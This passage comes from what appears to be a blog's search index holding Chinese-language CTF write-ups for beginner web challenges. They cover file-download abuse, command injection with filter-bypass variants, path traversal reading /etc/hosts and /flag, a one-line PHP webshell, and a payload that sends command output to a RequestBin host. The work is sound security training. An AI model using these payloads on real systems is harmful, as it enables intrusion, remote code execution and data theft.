punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    exit<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>還可以讀這個頁面<br>這個頁面是 PHP 的話就可以讀讀看<code>index.php</code></p><p><code>curl http://140.110.112.78:2505/download.php?f=index.php</code></p><p>從第一行可以看到他會去 include 另外一個 php 檔</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"config.inc.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>Downloader<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>File Download<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>download.php?f<span class="token punctuation">=</span>cute1.jpg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>貓貓<span class="token number">1</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>download.php?f<span class="token punctuation">=</span>cute2.jpg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>貓貓<span class="token number">2</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>download.php?f<span class="token punctuation">=</span>cute3.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>貓貓<span class="token number">3</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><p>所以再讀讀看<code>config.inc.php</code></p><p>就可以得到flag了</p><p><code>curl http://140.110.112.78:2505/download.php?f=config.inc.php</code></p><h3 id="lightning"><a href="#lightning" class="headerlink" title="lightning"></a>lightning</h3><blockquote><p><a href="http://140.110.112.78:2507/">http://140.110.112.78:2507/</a></p></blockquote><p>用<code>curl -v</code>去看網址之後會發現<code>302 Found</code></p><p>下面有一個<code>Location</code>是會連結到的網址</p><p>所以在 curl 一次就可以了</p><p>Q:為甚麼不能用瀏覽器看到 flag<br>A:因為你跳到 Location 裡面的連結的時候他又會重新導向到 nothing.php 的網址</p><h3 id="Cat-Digger"><a href="#Cat-Digger" class="headerlink" title="Cat Digger"></a>Cat Digger</h3><blockquote><p><a href="http://140.110.112.78:2509/">http://140.110.112.78:2509/</a></p></blockquote><p><code>google.com ; ls</code></p><p><code>google.com ; cat/flag</code><br>結果會變成<code>You can't use my cat!</code><br>可以知道他有擋文字試試看繞過 cat</p><p><code>google.com ; ca"t/flag</code><br>結果會變成<code>My cat doesn't like flag!</code><br>可以知道還有擋flag</p><p>一些繞過的方法</p><pre class=" language-bash"><code class="language-bash">google.com<span class="token punctuation">;</span> ca<span class="token string">''</span>t /fla<span class="token string">''</span>ggoogle.com<span class="token punctuation">;</span> ca<span class="token string">''</span>t /fla*google.com<span class="token punctuation">;</span> ca<span class="token string">''</span>t /fl?ggoogle.com<span class="token punctuation">;</span> ca<span class="token string">''</span>t /fl<span class="token string">""</span>aggoogle.com<span class="token punctuation">;</span> ca<span class="token string">''</span>t /fl<span class="token variable">${var}</span>aggoogle.com<span class="token punctuation">;</span> ca<span class="token string">''</span>t /fl\aggoogle.com<span class="token punctuation">;</span> <span class="token function">more</span> /fl<span class="token string">''</span>aggoogle.com<span class="token punctuation">;</span> <span class="token function">less</span> /fl<span class="token string">''</span>aggoogle.com<span class="token punctuation">;</span> <span class="token function">head</span> /fl<span class="token string">''</span>aggoogle.com<span class="token punctuation">;</span> <span class="token function">tail</span> /fl<span class="token string">''</span>aggoogle.com<span class="token punctuation">;</span> curl file:///fl<span class="token string">''</span>ag</code></pre><h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><blockquote><p><a href="http://140.110.112.78:2508/">http://140.110.112.78:2508/</a></p></blockquote><p>decode 之後會發現<code>system($_POST[123]);</code></p><p><code>eval(要執行的內容)</code> -&gt;執行</p><p><code>curl -v http://140.110.112.78:2508/ 'cat /flag'</code></p><h2 id="Web-Level-1"><a href="#Web-Level-1" class="headerlink" title="Web Level 1"></a>Web Level 1</h2><h3 id="Robots-txt"><a href="#Robots-txt" class="headerlink" title="Robots.txt"></a>Robots.txt</h3><blockquote><p>robots.txt是一種文字檔案，它告訴網路搜尋引擎此網站中的哪些內容是不應被搜尋引擎的搜尋到的，哪些是可以被搜尋引擎搜尋到的。 但駭客卻常透過robots.txt來知道哪些網頁目錄含有重要或是隱私資訊。</p><p>本題任務是請你找到robots.txt並因此找到flag。<br>提示1 : robots.txt的存放放置<br>提示2 : 相關hex to string及base64 編碼</p><p>請連結以下網址:<br><a href="http://120.114.62.202:2001/">http://120.114.62.202:2001/</a></p></blockquote><p>照他的題目名字去看robots.txt<br><img src="https://i.imgur.com/ucyDSL1.jpg"></p><p><img src="https://i.imgur.com/BGrjQFo.jpg"></p><p><img src="https://i.imgur.com/1qCI3ce.jpg"></p><p>可以拿到 <code>516e4a6c595774425445784456455a374e31463053304979546a5655624846425155563651334a36546b3939</code><br>再依照題敘做 hex to string 和 base64<br>hex to string :<code>QnJlYWtBTExDVEZ7N1F0S0IyTjVUbHFBQUV6Q3J6Tk99</code><br>base64 decode:<code>BreakALLCTF{7QtKB2N5TlqAAEzCrzNO}</code></p><h2 id="Web-Level-2"><a href="#Web-Level-2" class="headerlink" title="Web Level 2"></a>Web Level 2</h2><h3 id="Local-File-Inclusion"><a href="#Local-File-Inclusion" class="headerlink" title="Local File Inclusion"></a>Local File Inclusion</h3><blockquote><p>LFI(Local File Inclusion，本地文件載入)常是駭客常用的目錄遍歷攻擊(directory traversal attack)。請上網看看他的攻擊技術。</p><p>本題任務是請你使用LFI找到flag。<br>請連結以下網址進行解題:<br><a href="http://140.110.112.78:2003/">http://140.110.112.78:2003/</a></p></blockquote><p>在最上面那攔點 Home 和 About 可以看到<br>有 ?page= 所以可以試著輸入其他東西<br>所以我們試著一直回前頁到根目錄，因為不知道在多前面所以就打一堆<code>../</code></p><p><code>http://140.110.112.78:2003/index.php?page=../../../../../../etc/hosts</code></p><p>會跑出</p><pre class=" language-bash"><code class="language-bash">127.0.0.1 localhost ::1 localhost ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters 172.17.0.36 476d62ab5d51</code></pre><p>可以知道有到我們的根目錄了<br>再從根目錄去抓 flag 就可以了</p><p><code>http://140.110.112.78:2003/index.php?page=../../../../../../flag</code></p><h3 id="BabyCMDi"><a href="#BabyCMDi" class="headerlink" title="BabyCMDi"></a>BabyCMDi</h3><blockquote><p><a href="http://140.110.112.78:30005/">http://140.110.112.78:30005/</a></p></blockquote><p>用<a href="http://requestbin.net/">RequestBin</a>這個網址可以先建一個 server<br>創建一個RequestBin<br>複製他的網址後</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">$(</span>curl http://requestbin.net/r/1em8v3f1 -d <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">ls</span><span class="token variable">)</span></span>"</span><span class="token punctuation">)</span></code></pre><p><code>"$()"</code> 加”的原因 -&gt; 如果有兩個參數的話就會變成兩個字串，用雙引號包起來才會是一個字串<br>可以在 RequestBin 上面看到</p><p>RAW BODY</p><pre class=" language-bash"><code class="language-bash">flagindex.php</code></pre><p>可以知道可以把網址上的<code>index.php</code>直接改成<code>flag</code>就出來了</p><h2 id="Web-Getting-Started"><a href="#Web-Getting-Started" class="headerlink" title="Web_Getting Started"></a>Web_Getting Started</h2><h3 id="Redirect"><a href="#Redirect" class="headerlink" title="Redirect"></a>Redirect</h3><blockquote><p><a href="http://140.110.112.78:10203/">http://140.110.112.78:10203/</a></p></blockquote><p>點擊 <strong>按一下點我看 flag</strong></p><p>打開開發者模式之後</p><p>看到 network 那裏多了一個 flag.php</p><p>看一下他的 Header 會發現是<code>302 Found</code></p><p>然後它的 Location 是 <code>/</code> 就是該目錄的意思</p><p>所以直接 curl 它的 Request url <code>http://140.110.112.78:10203/flag.php</code>就可以了</p><h3 id="Form"><a href="#Form" class="headerlink" title="Form"></a>Form</h3><blockquote><p><a href="http://140.110.112.78:10204/">http://140.110.112.78:10204/</a></p></blockquote><p>目標：不要跑進去<code>return checkForm(this)</code>的函式(在 script 內)，跑進去就會被擋掉</p><p>解1<br>先把密碼打好<br>然後再 console ( JS 的編譯)裡打 `document.querySelector(‘form’).submit()<br>可以防止被擋掉</p><p>解2</p><p><code>curl http://140.110.112.78:10204/ -d 'pw=123'</code></p><p><code>-d</code> 後面接參數，相當於直接輸入</p><h3 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h3><blockquote><p><a href="http://140.110.112.78:10210/">http://140.110.112.78:10210/</a></p></blockquote><p>先建立一個php檔<br><code>vim test.php</code></p><p>裡面輸入<br><code>&lt;?php system($_GET['x']);</code></p><p>上傳檔案之後把他拿去 curl 可以得到網址<br>因為網址前面有 file 所以可以知道他在 file 裡面</p><p>把網址回前頁再加上 file 下去跑</p><pre class=" language-bash"><code class="language-bash">http://140.110.112.78:10210/?page<span class="token operator">=</span><span class="token punctuation">..</span>/files/dd0bf9bdec1a52e905c05f98f8cc8ae9/93bc3c03503d8768cf7cc1e39ce16fcb.txt</code></pre><p>可以看到是 ok 的！只是 system 沒有執行，因為沒有輸入 x 所以再加上 x</p><pre class=" language-bash"><code class="language-bash">http://140.110.112.78:10210/?page<span class="token operator">=</span><span class="token punctuation">..</span>/files/dd0bf9bdec1a52e905c05f98f8cc8ae9/93bc3c03503d8768cf7cc1e39ce16fcb.txt<span class="token operator">&amp;</span>x<span class="token operator">=</span>ls</code></pre><p>會出現<code>files flag_1223b8c30a347321299611f873b449ad.txt index.php mods upload.php </code></p><p>再用<code>x=</code>去抓 flag 就可以得到了</p><pre class=" language-bash"><code class="language-bash">http://140.110.112.78:10210/?page<span class="token operator">=</span><span class="token punctuation">..</span>/files/dd0bf9bdec1a52e905c05f98f8cc8ae9/93bc3c03503d8768cf7cc1e39ce16fcb.txt<span class="token operator">&amp;</span>x<span class="token operator">=</span>cat%20flag_1223b8c30a347321299611f873b449ad.txt</code></pre><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> SCIST </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Note </tag>
            
            <tag> SCIST </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
